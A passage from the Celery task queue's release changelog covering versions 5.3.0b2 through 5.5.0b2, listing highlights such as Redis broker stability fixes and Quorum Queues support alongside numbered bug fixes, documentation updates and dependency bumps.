- :setting:`task_default_queue_type`
- :setting:`worker_detect_quorum_queues`

After upgrading to this version, please share your feedback on the Quorum Queues support.

Relevant Issues:
`#6067 <https://github.com/celery/celery/discussions/6067>`_,
`#9121 <https://github.com/celery/celery/discussions/9121>`_

What's Changed
~~~~~~~~~~~~~~

- Bump pytest from 8.3.1 to 8.3.2 (#9153)
- Remove setuptools deprecated test command from setup.py (#9159)
- Pin pre-commit to latest version 3.8.0 from Python 3.9 (#9156)
- Bump mypy from 1.11.0 to 1.11.1 (#9164)
- Change "docker-compose" to "docker compose" in Makefile (#9169)
- update python versions and docker compose (#9171)
- Add support for Pydantic model validation/serialization (fixes #8751) (#9023)
- Allow local dynamodb to be installed on another host than localhost (#8965)
- Terminate job implementation for gevent concurrency backend (#9083)
- Bump Kombu to v5.4.0 (#9177)
- Add check for soft_time_limit and time_limit values (#9173)
- Prepare for (pre) release: v5.5.0b2 (#9178)

.. _version-5.5.0b1:

5.5.0b1
=======

:release-date: 2024-07-24
:release-by: Tomer Nosrati

Celery v5.5.0 Beta 1 is now available for testing.
Please help us test this version and report any issues.

Key Highlights
~~~~~~~~~~~~~~

Redis Broker Stability Improvements
-----------------------------------
The root cause of the Redis broker instability issue has been `identified and resolved <https://github.com/celery/kombu/pull/2007>`_
in the release-candidate for Kombu v5.4.0. This beta release has been upgraded to use the new
Kombu RC version, which should resolve the disconnections bug and offer additional improvements.

After upgrading to this version, please share your feedback on the Redis broker stability.

Relevant Issues:
`#7276 <https://github.com/celery/celery/discussions/7276>`_,
`#8091 <https://github.com/celery/celery/discussions/8091>`_,
`#8030 <https://github.com/celery/celery/discussions/8030>`_,
`#8384 <https://github.com/celery/celery/discussions/8384>`_

Quorum Queues Initial Support
-----------------------------
This release introduces the initial support for Quorum Queues with Celery. 

See new configuration options for more details:

- :setting:`task_default_queue_type`
- :setting:`worker_detect_quorum_queues`

After upgrading to this version, please share your feedback on the Quorum Queues support.

Relevant Issues:
`#6067 <https://github.com/celery/celery/discussions/6067>`_,
`#9121 <https://github.com/celery/celery/discussions/9121>`_

What's Changed
~~~~~~~~~~~~~~

- (docs): use correct version celery v.5.4.x (#8975)
- Update mypy to 1.10.0 (#8977)
- Limit pymongo<4.7 when Python <= 3.10 due to breaking changes in 4.7 (#8988)
- Bump pytest from 8.1.1 to 8.2.0 (#8987)
- Update README to Include FastAPI in Framework Integration Section (#8978)
- Clarify return values of ..._on_commit methods (#8984)
- add kafka broker docs (#8935)
- Limit pymongo<4.7 regardless of Python version (#8999)
- Update pymongo[srv] requirement from <4.7,>=4.0.2 to >=4.0.2,<4.8 (#9000)
- Update elasticsearch requirement from <=8.13.0 to <=8.13.1 (#9004)
- security: SecureSerializer: support generic low-level serializers (#8982)
- don't kill if pid same as file (#8997) (#8998)
- Update cryptography to 42.0.6 (#9005)
- Bump cryptography from 42.0.6 to 42.0.7 (#9009)
- Added -vv to unit, integration and smoke tests (#9014)
- SecuritySerializer: ensure pack separator will not be conflicted with serialized fields (#9010)
- Update sphinx-click to 5.2.2 (#9025)
- Bump sphinx-click from 5.2.2 to 6.0.0 (#9029)
- Fix a typo to display the help message in first-steps-with-django (#9036)
- Pinned requests to v2.31.0 due to docker-py bug #3256 (#9039)
- Fix certificate validity check (#9037)
- Revert "Pinned requests to v2.31.0 due to docker-py bug #3256" (#9043)
- Bump pytest from 8.2.0 to 8.2.1 (#9035)
- Update elasticsearch requirement from <=8.13.1 to <=8.13.2 (#9045)
- Fix detection of custom task set as class attribute with Django (#9038)
- Update elastic-transport requirement from <=8.13.0 to <=8.13.1 (#9050)
- Bump pycouchdb from 1.14.2 to 1.16.0 (#9052)
- Update pytest to 8.2.2 (#9060)
- Bump cryptography from 42.0.7 to 42.0.8 (#9061)
- Update elasticsearch requirement from <=8.13.2 to <=8.14.0 (#9069)
- [enhance feature] Crontab schedule: allow using month names (#9068)
- Enhance tox environment: [testenv:clean] (#9072)
- Clarify docs about Reserve one task at a time (#9073)
- GCS docs fixes (#9075)
- Use hub.remove_writer instead of hub.remove for write fds (#4185) (#9055)
- Class method to process crontab string (#9079)
- Fixed smoke tests env bug when using integration tasks that rely on Redis (#9090)
- Bugfix - a task will run multiple times when chaining chains with groups (#9021)
- Bump mypy from 1.10.0 to 1.10.1 (#9096)
- Don't add a separator to global_keyprefix if it already has one (#9080)
- Update pymongo[srv] requirement from <4.8,>=4.0.2 to >=4.0.2,<4.9 (#9111)
- Added missing import in examples for Django (#9099)
- Bump Kombu to v5.4.0rc1 (#9117)
- Removed skipping Redis in t/smoke/tests/test_consumer.py tests (#9118)
- Update pytest-subtests to 0.13.0 (#9120)
- Increased smoke tests CI timeout (#9122)
- Bump Kombu to v5.4.0rc2 (#9127)
- Update zstandard to 0.23.0 (#9129)
- Update pytest-subtests to 0.13.1 (#9130)
- Changed retry to tenacity in smoke tests (#9133)
- Bump mypy from 1.10.1 to 1.11.0 (#9135)
- Update cryptography to 43.0.0 (#9138)
- Update pytest to 8.3.1 (#9137)
- Added support for Quorum Queues (#9121)
- Bump Kombu to v5.4.0rc3 (#9139)
- Cleanup in Changelog.rst (#9141)
- Update Django docs for CELERY_CACHE_BACKEND (#9143)
- Added missing docs to previous releases (#9144)
- Fixed a few documentation build warnings (#9145)
- docs(README): link invalid (#9148)
- Prepare for (pre) release: v5.5.0b1 (#9146)

.. _version-5.4.0:

5.4.0
=====

:release-date: 2024-04-17
:release-by: Tomer Nosrati

Celery v5.4.0 and v5.3.x have consistently focused on enhancing the overall QA, both internally and externally.
This effort led to the new pytest-celery v1.0.0 release, developed concurrently with v5.3.0 & v5.4.0.

This release introduces two significant QA enhancements:

- **Smoke Tests**: A new layer of automatic tests has been added to Celery's standard CI. These tests are designed to handle production scenarios and complex conditions efficiently. While new contributions will not be halted due to the lack of smoke tests, we will request smoke tests for advanced changes where appropriate.
- `Standalone Bug Report Script <https://docs.celeryq.dev/projects/pytest-celery/en/latest/userguide/celery-bug-report.html>`_: The new pytest-celery plugin now allows for encapsulating a complete Celery dockerized setup within a single pytest script. Incorporating these into new bug reports will enable us to reproduce reported bugs deterministically, potentially speeding up the resolution process.

Contrary to the positive developments above, there have been numerous reports about issues with the Redis broker malfunctioning
upon restarts and disconnections. Our initial attempts to resolve this were not successful (#8796).
With our enhanced QA capabilities, we are now prepared to address the core issue with Redis (as a broker) again.

The rest of the changes for this release are grouped below, with the changes from the latest release candidate listed at the end.

Changes
~~~~~~~
- Add a Task class specialised for Django (#8491)
- Add Google Cloud Storage (GCS) backend (#8868)
- Added documentation to the smoke tests infra (#8970)
- Added a checklist item for using pytest-celery in a bug report (#8971)
- Bugfix: Missing id on chain (#8798)
- Bugfix: Worker not consuming tasks after Redis broker restart (#8796)
- Catch UnicodeDecodeError when opening corrupt beat-schedule.db (#8806)
- chore(ci): Enhance CI with `workflow_dispatch` for targeted debugging and testing (#8826)
- Doc: Enhance "Testing with Celery" section (#8955)
- Docfix: pip install celery[sqs] -> pip install "celery[sqs]" (#8829)
- Enable efficient `chord` when using dynamicdb as backend store (#8783)
- feat(daemon): allows daemonization options to be fetched from app settings (#8553)
- Fix DeprecationWarning: datetime.datetime.utcnow() (#8726)
- Fix recursive result parents on group in middle of chain (#8903)
- Fix typos and grammar (#8915)
- Fixed version documentation tag from #8553 in configuration.rst (#8802)
- Hotfix: Smoke tests didn't allow customizing the worker's command arguments, now it does (#8937)
- Make custom remote control commands available in CLI (#8489)
- Print safe_say() to stdout for non-error flows (#8919)
- Support moto 5.0 (#8838)
- Update contributing guide to use ssh upstream url (#8881)
- Update optimizing.rst (#8945)
- Updated concurrency docs page. (#8753)

Dependencies Updates
~~~~~~~~~~~~~~~~~~~~
- Bump actions/setup-python from 4 to 5 (#8701)
- Bump codecov/codecov-action from 3 to 4 (#8831)
- Bump isort from 5.12.0 to 5.13.2 (#8772)
- Bump msgpack from 1.0.7 to 1.0.8 (#8885)
- Bump mypy from 1.8.0 to 1.9.0 (#8898)
- Bump pre-commit to 3.6.1 (#8839)
- Bump pre-commit/action from 3.0.0 to 3.0.1 (#8835)
- Bump pytest from 8.0.2 to 8.1.1 (#8901)
- Bump pytest-celery to v1.0.0 (#8962)
- Bump pytest-cov to 5.0.0 (#8924)
- Bump pytest-order from 1.2.0 to 1.2.1 (#8941)
- Bump pytest-subtests from 0.11.0 to 0.12.1 (#8896)
- Bump pytest-timeout from 2.2.0 to 2.3.1 (#8894)
- Bump python-memcached from 1.59 to 1.61 (#8776)
- Bump sphinx-click from 4.4.0 to 5.1.0 (#8774)
- Update cryptography to 42.0.5 (#8869)
- Update elastic-transport requirement from <=8.12.0 to <=8.13.0 (#8933)
- Update elasticsearch requirement from <=8.12.1 to <=8.13.0 (#8934)
- Upgraded Sphinx from v5.3.0 to v7.x.x (#8803)

Changes since 5.4.0rc2
~~~~~~~~~~~~~~~~~~~~~~~
- Update elastic-transport requirement from <=8.12.0 to <=8.13.0 (#8933)
- Update elasticsearch requirement from <=8.12.1 to <=8.13.0 (#8934)
- Hotfix: Smoke tests didn't allow customizing the worker's command arguments, now it does (#8937)
- Bump pytest-celery to 1.0.0rc3 (#8946)
- Update optimizing.rst (#8945)
- Doc: Enhance "Testing with Celery" section (#8955)
- Bump pytest-celery to v1.0.0 (#8962)
- Bump pytest-order from 1.2.0 to 1.2.1 (#8941)
- Added documentation to the smoke tests infra (#8970)
- Added a checklist item for using pytest-celery in a bug report (#8971)
- Added changelog for v5.4.0 (#8973)
- Bump version: 5.4.0rc2 → 5.4.0 (#8974)

.. _version-5.4.0rc2:

5.4.0rc2
========

:release-date: 2024-03-27
:release-by: Tomer Nosrati

- feat(daemon): allows daemonization options to be fetched from app settings (#8553)
- Fixed version documentation tag from #8553 in configuration.rst (#8802)
- Upgraded Sphinx from v5.3.0 to v7.x.x (#8803)
- Update elasticsearch requirement from <=8.11.1 to <=8.12.0 (#8810)
- Update elastic-transport requirement from <=8.11.0 to <=8.12.0 (#8811)
- Update cryptography to 42.0.0 (#8814)
- Catch UnicodeDecodeError when opening corrupt beat-schedule.db (#8806)
- Update cryptography to 42.0.1 (#8817)
- Limit moto to <5.0.0 until the breaking issues are fixed (#8820)
- Enable efficient `chord` when using dynamicdb as backend store (#8783)
- Add a Task class specialised for Django (#8491)
- Sync kombu versions in requirements and setup.cfg (#8825)
- chore(ci): Enhance CI with `workflow_dispatch` for targeted debugging and testing (#8826)
- Update cryptography to 42.0.2 (#8827)
- Docfix: pip install celery[sqs] -> pip install "celery[sqs]" (#8829)
- Bump pre-commit/action from 3.0.0 to 3.0.1 (#8835)
- Support moto 5.0 (#8838)
- Another fix for `link_error` signatures being `dict`s instead of `Signature` s (#8841)
- Bump codecov/codecov-action from 3 to 4 (#8831)
- Upgrade from pytest-celery v1.0.0b1 -> v1.0.0b2 (#8843)
- Bump pytest from 7.4.4 to 8.0.0 (#8823)
- Update pre-commit to 3.6.1 (#8839)
- Update cryptography to 42.0.3 (#8854)
- Bump pytest from 8.0.0 to 8.0.1 (#8855)
- Update cryptography to 42.0.4 (#8864)
- Update pytest to 8.0.2 (#8870)
- Update cryptography to 42.0.5 (#8869)
- Update elasticsearch requirement from <=8.12.0 to <=8.12.1 (#8867)
- Eliminate consecutive chords generated by group | task upgrade (#8663)
- Make custom remote control commands available in CLI (#8489)
- Add Google Cloud Storage (GCS) backend (#8868)
- Bump msgpack from 1.0.7 to 1.0.8 (#8885)
- Update pytest to 8.1.0 (#8886)
- Bump pytest-timeout from 2.2.0 to 2.3.1 (#8894)
- Bump pytest-subtests from 0.11.0 to 0.12.1 (#8896)
- Bump mypy from 1.8.0 to 1.9.0 (#8898)
- Update pytest to 8.1.1 (#8901)
- Update contributing guide to use ssh upstream url (#8881)
- Fix recursive result parents on group in middle of chain (#8903)
- Bump pytest-celery to 1.0.0b4 (#8899)
- Adjusted smoke tests CI time limit (#8907)
- Update pytest-rerunfailures to 14.0 (#8910)
- Use the "all" extra for pytest-celery (#8911)
- Fix typos and grammar (#8915)
- Bump pytest-celery to 1.0.0rc1 (#8918)
- Print safe_say() to stdout for non-error flows (#8919)
- Update pytest-cov to 5.0.0 (#8924)
- Bump pytest-celery to 1.0.0rc2 (#8928)

.. _version-5.4.0rc1:

5.4.0rc1
========

:release-date: 2024-01-17 7:00 P.M GMT+2
:release-by: Tomer Nosrati

Celery v5.4 continues our effort to provide improved stability in production
environments. The release candidate version is available for testing.
The official release is planned for March-April 2024.

- New Config: worker_enable_prefetch_count_reduction (#8581)
- Added "Serverless" section to Redis doc (redis.rst) (#8640)
- Upstash's Celery example repo link fix (#8665)
- Update mypy version (#8679)
- Update cryptography dependency to 41.0.7 (#8690)
- Add type annotations to celery/utils/nodenames.py (#8667)
- Issue 3426. Adding myself to the contributors. (#8696)
- Bump actions/setup-python from 4 to 5 (#8701)
- Fixed bug where chord.link_error() throws an exception on a dict type errback object (#8702)
- Bump github/codeql-action from 2 to 3 (#8725)
- Fixed multiprocessing integration tests not running on Mac (#8727)
- Added make docker-docs (#8729)
- Fix DeprecationWarning: datetime.datetime.utcnow() (#8726)
- Remove `new` adjective in docs (#8743)
- add type annotation to celery/utils/sysinfo.py (#8747)
- add type annotation to celery/utils/iso8601.py (#8750)
- Change type annotation to celery/utils/iso8601.py (#8752)
- Update test deps (#8754)
- Mark flaky: test_asyncresult_get_cancels_subscription() (#8757)
- change _read_as_base64 (b64encode returns bytes) on celery/utils/term.py (#8759)
- Replace string concatenation with fstring on celery/utils/term.py (#8760)
- Add type annotation to celery/utils/term.py (#8755)
- Skipping test_tasks::test_task_accepted (#8761)
- Updated concurrency docs page. (#8753)
- Changed pyup -> dependabot for updating dependencies (#8764)
- Bump isort from 5.12.0 to 5.13.2 (#8772)
- Update elasticsearch requirement from <=8.11.0 to <=8.11.1 (#8775)
- Bump sphinx-click from 4.4.0 to 5.1.0 (#8774)
- Bump python-memcached from 1.59 to 1.61 (#8776)
- Update elastic-transport requirement from <=8.10.0 to <=8.11.0 (#8780)
- python-memcached==1.61 -> python-memcached>=1.61 (#8787)
- Remove usage of utcnow (#8791)
- Smoke Tests (#8793)
- Moved smoke tests to their own workflow (#8797)
- Bugfix: Worker not consuming tasks after Redis broker restart (#8796)
- Bugfix: Missing id on chain (#8798)

.. _version-5.3.6:

5.3.6
=====

:release-date: 2023-11-22  9:15 P.M GMT+6
:release-by: Asif Saif Uddin

This release is focused mainly to fix AWS SQS new feature comatibility issue and old regressions. 
The code changes are mostly fix for regressions. More details can be found below.

- Increased docker-build CI job timeout from 30m -> 60m (#8635)
- Incredibly minor spelling fix. (#8649)
- Fix non-zero exit code when receiving remote shutdown (#8650)
- Update task.py get_custom_headers missing 'compression' key (#8633)
- Update kombu>=5.3.4 to fix SQS request compatibility with boto JSON serializer (#8646)
- test requirements version update (#8655)
- Update elasticsearch version (#8656)
- Propagates more ImportErrors during autodiscovery (#8632)

.. _version-5.3.5:

5.3.5
=====

:release-date: 2023-11-10  7:15 P.M GMT+6
:release-by: Asif Saif Uddin

- Update test.txt versions (#8481)
- fix os.getcwd() FileNotFoundError (#8448)
- Fix typo in CONTRIBUTING.rst (#8494)
- typo(doc): configuration.rst (#8484)
- assert before raise (#8495)
- Update GHA checkout version (#8496)
- Fixed replaced_task_nesting (#8500)
- Fix code indentation for route_task() example (#8502)
- support redis 5.x (#8504)
- Fix typos in test_canvas.py (#8498)
- Marked flaky tests (#8508)
- Fix typos in calling.rst (#8506)
- Added support for replaced_task_nesting in chains (#8501)
- Fix typos in canvas.rst (#8509)
- Patch Version Release Checklist (#8488)
- Added Python 3.11 support to Dockerfile (#8511)
- Dependabot (Celery) (#8510)
- Bump actions/checkout from 3 to 4 (#8512)
- Update ETA example to include timezone (#8516)
- Replaces datetime.fromisoformat with the more lenient dateutil parser (#8507)
- Fixed indentation in Dockerfile for Python 3.11 (#8527)
- Fix git bug in Dockerfile (#8528)
- Tox lint upgrade from Python 3.9 to Python 3.11 (#8526)
- Document gevent concurrency (#8520)
- Update test.txt (#8530)
- Celery Docker Upgrades (#8531)
- pyupgrade upgrade v3.11.0 -> v3.13.0 (#8535)
- Update msgpack.txt (#8548)
- Update auth.txt (#8547)
- Update msgpack.txt to fix build issues (#8552)
- Basic ElasticSearch / ElasticClient 8.x Support (#8519)
- Fix eager tasks does not populate name field (#8486)
- Fix typo in celery.app.control (#8563)
- Update solar.txt ephem (#8566)
- Update test.txt pytest-timeout (#8565)
- Correct some mypy errors (#8570)
- Update elasticsearch.txt (#8573)
- Update test.txt deps (#8574)
- Update test.txt (#8590)
- Improved the "Next steps" documentation (#8561). (#8600)
- Disabled couchbase tests due to broken package breaking main (#8602)
- Update elasticsearch deps (#8605)
- Update cryptography==41.0.5 (#8604)
- Update pytest==7.4.3 (#8606)
- test initial support of python 3.12.x (#8549)
- updated new versions to fix CI (#8607)
- Update zstd.txt (#8609)
- Fixed CI Support with Python 3.12 (#8611)
- updated CI, docs and classifier for next release (#8613)
- updated dockerfile to add python 3.12 (#8614)
- lint,mypy,docker-unit-tests -> Python 3.12 (#8617)
- Correct type of `request` in `task_revoked` documentation (#8616)
- update docs docker image (#8618)
- Fixed RecursionError caused by giving `config_from_object` nested mod… (#8619)
- Fix: serialization error when gossip working (#6566)
- [documentation] broker_connection_max_retries of 0 does not mean "retry forever" (#8626)
- added 2 debian package for better stability in Docker (#8629)

.. _version-5.3.4:

5.3.4
=====

:release-date: 2023-09-03 10:10 P.M GMT+2
:release-by: Tomer Nosrati

.. warning::
   This version has reverted the breaking changes introduced in 5.3.2 and 5.3.3:

   - Revert "store children with database backend" (#8475)
   - Revert "Fix eager tasks does not populate name field" (#8476)

- Bugfix: Removed unecessary stamping code from _chord.run() (#8339)
- User guide fix (hotfix for #1755) (#8342)
- store children with database backend (#8338)
- Stamping bugfix with group/chord header errback linking (#8347)
- Use argsrepr and kwargsrepr in LOG_RECEIVED (#8301)
- Fixing minor typo in code example in calling.rst (#8366)
- add documents for timeout settings (#8373)
- fix: copyright year (#8380)
- setup.py: enable include_package_data (#8379)
- Fix eager tasks does not populate name field (#8383)
- Update test.txt dependencies (#8389)
- Update auth.txt deps (#8392)
- Fix backend.get_task_meta ignores the result_extended config parameter in mongodb backend (#8391)
- Support preload options for shell and purge commands (#8374)
- Implement safer ArangoDB queries (#8351)
- integration test: cleanup worker after test case (#8361)
- Added "Tomer Nosrati" to CONTRIBUTORS.txt (#8400)
- Update README.rst (#8404)
- Update README.rst (#8408)
- fix(canvas): add group index when unrolling tasks (#8427)
- fix(beat): debug statement should only log AsyncResult.id if it exists (#8428)
- Lint fixes & pre-commit autoupdate (#8414)
- Update auth.txt (#8435)
- Update mypy on test.txt (#8438)
- added missing kwargs arguments in some cli cmd (#8049)
- Fix #8431: Set format_date to False when calling _get_result_meta on mongo backend (#8432)
- Docs: rewrite out-of-date code (#8441)
- Limit redis client to 4.x since 5.x fails the test suite (#8442)
- Limit tox to < 4.9 (#8443)
- Fixed issue: Flags broker_connection_retry_on_startup & broker_connection_retry aren’t reliable (#8446)
- doc update from #7651 (#8451)
- Remove tox version limit (#8464)
- Fixed AttributeError: 'str' object has no attribute (#8463)
- Upgraded Kombu from 5.3.1 -> 5.3.2 (#8468)
- Document need for CELERY_ prefix on CLI env vars (#8469)
- Use string value for CELERY_SKIP_CHECKS envvar (#8462)
- Revert "store children with database backend" (#8475)
- Revert "Fix eager tasks does not populate name field" (#8476)
- Update Changelog (#8474)
- Remove as it seems to be buggy. (#8340)
- Revert "Add Semgrep to CI" (#8477)
- Revert "Revert "Add Semgrep to CI"" (#8478)

.. _version-5.3.3:

5.3.3 (Yanked)
==============

:release-date: 2023-08-31 1:47 P.M GMT+2
:release-by: Tomer Nosrati

.. warning::
   This version has been yanked due to breaking API changes. The breaking changes include:

   - Store children with database backend (#8338)
   - Fix eager tasks does not populate name field (#8383)

- Fixed changelog for 5.3.2 release docs.

.. _version-5.3.2:

5.3.2 (Yanked)
==============

:release-date: 2023-08-31 1:30 P.M GMT+2
:release-by: Tomer Nosrati

.. warning::
   This version has been yanked due to breaking API changes. The breaking changes include:

   - Store children with database backend (#8338)
   - Fix eager tasks does not populate name field (#8383)

- Bugfix: Removed unecessary stamping code from _chord.run() (#8339)
- User guide fix (hotfix for #1755) (#8342)
- Store children with database backend (#8338)
- Stamping bugfix with group/chord header errback linking (#8347)
- Use argsrepr and kwargsrepr in LOG_RECEIVED (#8301)
- Fixing minor typo in code example in calling.rst (#8366)
- Add documents for timeout settings (#8373)
- Fix: copyright year (#8380)
- Setup.py: enable include_package_data (#8379)
- Fix eager tasks does not populate name field (#8383)
- Update test.txt dependencies (#8389)
- Update auth.txt deps (#8392)
- Fix backend.get_task_meta ignores the result_extended config parameter in mongodb backend (#8391)
- Support preload options for shell and purge commands (#8374)
- Implement safer ArangoDB queries (#8351)
- Integration test: cleanup worker after test case (#8361)
- Added "Tomer Nosrati" to CONTRIBUTORS.txt (#8400)
- Update README.rst (#8404)
- Update README.rst (#8408)
- Fix(canvas): add group index when unrolling tasks (#8427)
- Fix(beat): debug statement should only log AsyncResult.id if it exists (#8428)
- Lint fixes & pre-commit autoupdate (#8414)
- Update auth.txt (#8435)
- Update mypy on test.txt (#8438)
- Added missing kwargs arguments in some cli cmd (#8049)
- Fix #8431: Set format_date to False when calling _get_result_meta on mongo backend (#8432)
- Docs: rewrite out-of-date code (#8441)
- Limit redis client to 4.x since 5.x fails the test suite (#8442)
- Limit tox to < 4.9 (#8443)
- Fixed issue: Flags broker_connection_retry_on_startup & broker_connection_retry aren’t reliable (#8446)
- Doc update from #7651 (#8451)
- Remove tox version limit (#8464)
- Fixed AttributeError: 'str' object has no attribute (#8463)
- Upgraded Kombu from 5.3.1 -> 5.3.2 (#8468)

.. _version-5.3.1:

5.3.1
=====

:release-date: 2023-06-18  8:15 P.M GMT+6
:release-by: Asif Saif Uddin

- Upgrade to latest pycurl release (#7069).
- Limit librabbitmq>=2.0.0; python_version < '3.11' (#8302).
- Added initial support for python 3.11 (#8304).
- ChainMap observers fix (#8305).
- Revert optimization CLI flag behaviour back to original.
- Restrict redis 4.5.5 as it has severe bugs (#8317).
- Tested pypy 3.10 version in CI (#8320).
- Bump new version of kombu to 5.3.1 (#8323).
- Fixed a small float value of retry_backoff (#8295).
- Limit pyro4 up to python 3.10 only as it is (#8324).

.. _version-5.3.0:

5.3.0
=====

:release-date: 2023-06-06 12:00 P.M GMT+6
:release-by: Asif Saif Uddin

- Test kombu 5.3.0 & minor doc update (#8294).
- Update librabbitmq.txt > 2.0.0 (#8292).
- Upgrade syntax to py3.8 (#8281).

.. _version-5.3.0rc2:

5.3.0rc2
========

:release-date: 2023-05-31 9:00 P.M GMT+6
:release-by: Asif Saif Uddin

- Add missing dependency.
- Fix exc_type being the exception instance rather.
- Fixed revoking tasks by stamped headers (#8269).
- Support sqlalchemy 2.0 in tests (#8271).
- Fix docker (#8275).
- Update redis.txt to 4.5 (#8278).
- Update kombu>=5.3.0rc2.


.. _version-5.3.0rc1:

5.3.0rc1
========

:release-date: 2023-05-11 4:24 P.M GMT+2
:release-by: Tomer Nosrati

- fix functiom name by @cuishuang in #8087
- Update CELERY_TASK_EAGER setting in user guide by @thebalaa in #8085
- Stamping documentation fixes & cleanups by @Nusnus in #8092
- switch to maintained pyro5 by @auvipy in #8093
- udate dependencies of tests by @auvipy in #8095
- cryptography==39.0.1 by @auvipy in #8096
- Annotate celery/security/certificate.py by @Kludex in #7398
- Deprecate parse_iso8601 in favor of fromisoformat by @stumpylog in #8098
- pytest==7.2.2 by @auvipy in #8106
- Type annotations for celery/utils/text.py by @max-muoto in #8107
- Update web framework URLs by @sblondon in #8112
- Fix contribution URL by @sblondon in #8111
- Trying to clarify CERT_REQUIRED by @pamelafox in #8113
- Fix potential AttributeError on 'stamps' by @Darkheir in #8115
- Type annotations for celery/apps/beat.py by @max-muoto in #8108
- Fixed bug where retrying a task loses its stamps by @Nusnus in #8120
- Type hints for celery/schedules.py by @max-muoto in #8114
- Reference Gopher Celery in README by @marselester in #8131
- Update sqlalchemy.txt by @auvipy in #8136
- azure-storage-blob 12.15.0 by @auvipy in #8137
- test kombu 5.3.0b3 by @auvipy in #8138
- fix: add expire string parse. by @Bidaya0 in #8134
- Fix worker crash on un-pickleable exceptions by @youtux in #8133
- CLI help output: avoid text rewrapping by click by @woutdenolf in #8152
- Warn when an unnamed periodic task override another one. by @iurisilvio in #8143
- Fix Task.handle_ignore not wrapping exceptions properly by @youtux in #8149
- Hotfix for (#8120) - Stamping bug with retry by @Nusnus in #8158
- Fix integration test by @youtux in #8156
- Fixed bug in revoke_by_stamped_headers where impl did not match doc by @Nusnus in #8162
- Align revoke and revoke_by_stamped_headers return values (terminate=True) by @Nusnus in #8163
- Update & simplify GHA pip caching by @stumpylog in #8164
- Update auth.txt by @auvipy in #8167
- Update test.txt versions by @auvipy in #8173
- remove extra = from test.txt by @auvipy in #8179
- Update sqs.txt kombu[sqs]>=5.3.0b3 by @auvipy in #8174
- Added signal triggered before fork by @jaroslawporada in #8177
- Update documentation on SQLAlchemy by @max-muoto in #8188
- Deprecate pytz and use zoneinfo by @max-muoto in #8159
- Update dev.txt by @auvipy in #8192
- Update test.txt by @auvipy in #8193
- Update test-integration.txt by @auvipy in #8194
- Update zstd.txt by @auvipy in #8195
- Update s3.txt by @auvipy in #8196
- Update msgpack.txt by @auvipy in #8199
- Update solar.txt by @auvipy in #8198
- Add Semgrep to CI by @Nusnus in #8201
- Added semgrep to README.rst by @Nusnus in #8202
- Update django.txt by @auvipy in #8197
- Update redis.txt 4.3.6 by @auvipy in #8161
- start removing codecov from pypi by @auvipy in #8206
- Update test.txt dependencies by @auvipy in #8205
- Improved doc for: worker_deduplicate_successful_tasks by @Nusnus in #8209
- Renamed revoked_headers to revoked_stamps by @Nusnus in #8210
- Ensure argument for map is JSON serializable by @candleindark in #8229

.. _version-5.3.0b2:

5.3.0b2
=======

:release-date: 2023-02-19 1:47 P.M GMT+2
:release-by: Asif Saif Uddin

- BLM-2: Adding unit tests to chord clone by @Nusnus in #7668
- Fix unknown task error typo by @dcecile in #7675
- rename redis integration test class so that tests are executed by @wochinge in #7684
- Check certificate/private key type when loading them by @qrmt in #7680
- Added integration test_chord_header_id_duplicated_on_rabbitmq_msg_duplication() by @Nusnus in #7692
- New feature flag: allow_error_cb_on_chord_header - allowing setting an error callback on chord header by @Nusnus in #7712
- Update README.rst sorting Python/Celery versions by @andrebr in #7714
- Fixed a bug where stamping a chord body would not use the correct stamping method by @Nusnus in #7722
- Fixed doc duplication typo for Signature.stamp() by @Nusnus in #7725
- Fix issue 7726: variable used in finally block may not be instantiated by @woutdenolf in #7727
- Fixed bug in chord stamping with another chord as a body + unit test by @Nusnus in #7730
- Use "describe_table" not "create_table" to check for existence of DynamoDB table by @maxfirman in #7734
- Enhancements for task_allow_error_cb_on_chord_header tests and docs by @Nusnus in #7744
- Improved custom stamping visitor documentation by @Nusnus in #7745
- Improved the coverage of test_chord_stamping_body_chord() by @Nusnus in #7748
- billiard >= 3.6.3.0,<5.0 for rpm by @auvipy in #7764
- Fixed memory leak with ETA tasks at connection error when worker_cancel_long_running_tasks_on_connection_loss is enabled by @Nusnus in #7771
- Fixed bug where a chord with header of type tuple was not supported in the link_error flow for task_allow_error_cb_on_chord_header flag by @Nusnus in #7772
- Scheduled weekly dependency update for week 38 by @pyup-bot in #7767
- recreate_module: set spec to the new module by @skshetry in #7773
- Override integration test config using integration-tests-config.json by @thedrow in #7778
- Fixed error handling bugs due to upgrade to a newer version of billiard by @Nusnus in #7781
- Do not recommend using easy_install anymore by @jugmac00 in #7789
- GitHub Workflows security hardening by @sashashura in #7768
- Update ambiguous acks_late doc by @Zhong-z in #7728
- billiard >=4.0.2,<5.0 by @auvipy in #7720
- importlib_metadata remove deprecated entry point interfaces by @woutdenolf in #7785
- Scheduled weekly dependency update for week 41 by @pyup-bot in #7798
- pyzmq>=22.3.0 by @auvipy in #7497
- Remove amqp from the BACKEND_ALISES list by @Kludex in #7805
- Replace print by logger.debug by @Kludex in #7809
- Ignore coverage on except ImportError by @Kludex in #7812
- Add mongodb dependencies to test.txt by @Kludex in #7810
- Fix grammar typos on the whole project by @Kludex in #7815
- Remove isatty wrapper function by @Kludex in #7814
- Remove unused variable _range by @Kludex in #7813
- Add type annotation on concurrency/threads.py by @Kludex in #7808
- Fix linter workflow by @Kludex in #7816
- Scheduled weekly dependency update for week 42 by @pyup-bot in #7821
- Remove .cookiecutterrc by @Kludex in #7830
- Remove .coveragerc file by @Kludex in #7826
- kombu>=5.3.0b2 by @auvipy in #7834
- Fix readthedocs build failure by @woutdenolf in #7835
- Fixed bug in group, chord, chain stamp() method, where the visitor overrides the previously stamps in tasks of these objects by @Nusnus in #7825
- Stabilized test_mutable_errback_called_by_chord_from_group_fail_multiple by @Nusnus in #7837
- Use SPDX license expression in project metadata by @RazerM in #7845
- New control command revoke_by_stamped_headers by @Nusnus in #7838
- Clarify wording in Redis priority docs by @strugee in #7853
- Fix non working example of using celery_worker pytest fixture by @paradox-lab in #7857
- Removed the mandatory requirement to include stamped_headers key when implementing on_signature() by @Nusnus in #7856
- Update serializer docs by @sondrelg in #7858
- Remove reference to old Python version by @Kludex in #7829
- Added on_replace() to Task to allow manipulating the replaced sig with custom changes at the end of the task.replace() by @Nusnus in #7860
- Add clarifying information to completed_count documentation by @hankehly in #7873
- Stabilized test_revoked_by_headers_complex_canvas by @Nusnus in #7877
- StampingVisitor will visit the callbacks and errbacks of the signature by @Nusnus in #7867
- Fix "rm: no operand" error in clean-pyc script by @hankehly in #7878
- Add --skip-checks flag to bypass django core checks by @mudetz in #7859
- Scheduled weekly dependency update for week 44 by @pyup-bot in #7868
- Added two new unit tests to callback stamping by @Nusnus in #7882
